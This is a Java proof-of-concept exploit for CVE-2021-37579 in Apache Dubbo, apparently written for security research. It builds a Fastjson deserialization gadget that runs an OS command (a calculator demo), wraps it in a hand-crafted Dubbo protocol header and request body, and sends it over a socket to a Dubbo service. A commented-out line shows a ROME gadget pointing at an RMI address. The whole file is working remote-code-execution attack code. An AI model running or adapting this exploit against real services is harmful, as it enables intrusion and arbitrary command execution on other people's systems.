package org.example;

import org.apache.dubbo.common.io.Bytes;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

/**
 * @author Whoopsunix
 *
 * CVE-2021-37579
 */
public class CVE_2021_37579 {
    protected static final byte FLAG_REQUEST = (byte) 0x80;
    protected static final byte FLAG_TWOWAY = (byte) 0x40;
    protected static final byte FLAG_EVENT = (byte) 0x20;

    public static void main(String[] args) throws Exception {
//        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/lc8yjj");
        Object o = GadgetBuilder.fastjson("open -a Calculator.app");


        // header.
        byte[] header = new byte[16];

        // set magic number.
        Bytes.short2bytes((short) 0xdabb , header);

        // set request and serialization flag.
        // 2 -> "hessian2"
        // 3 -> "java"
        // 4 -> "compactedjava"
        // 6 -> "fastjson"
        // 7 -> "nativejava"
        // 8 -> "kryo"
        // 9 -> "fst"
        // 10 -> "native-hessian"
        // 11 -> "avro"
        // 12 -> "protostuff"
        // 16 -> "gson"
        // 21 -> "protobuf-json"
        // 22 -> "protobuf"
        // 25 -> "kryo2"
        boolean isResponse = false;
        boolean okResponse = true;
        if (isResponse) {
            header[2] = (byte) 3;
            if (okResponse) {
                header[3] = (byte) 20;
            } else {
                header[3] = (byte) 0;
            }
        } else {
            header[2] = (byte) (FLAG_REQUEST | 3);
        }

        boolean isTwoWay = true;
        if (isTwoWay) {
            header[2] |= FLAG_TWOWAY;
        }

        boolean isEvent = false;
        if (isEvent) {
            header[2] |= FLAG_EVENT;
        }

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        try {
            /* For Requests, we need to encode the following objects
              1.dubboVersion
              2.path
              3.version
              4.methodName
              5.methodDesc
              6.paramsObject
              7.map
            */
            oos.writeInt(666);
            oos.writeUTF("0.0.0");
            oos.writeInt(666);
            oos.writeUTF("org.example.api.DemoService");
            oos.writeInt(666);
            oos.writeUTF("0.0.0");
            oos.writeInt(666);
            oos.writeUTF("sayHello");
            oos.writeInt(666);
            oos.writeUTF("Ljava/lang/String;");
            oos.writeByte(666);
            oos.writeObject(o);
        } finally {
            if (oos != null) {
                oos.close();
            }
        }
        // write length of body into header
        Bytes.int2bytes(baos.size(), header, 12);
        // write header into OS
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        // write payload into OS
        byteArrayOutputStream.write(baos.toByteArray());
        // get bytes
        byte[] bytes = byteArrayOutputStream.toByteArray();
        // send bytes
        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
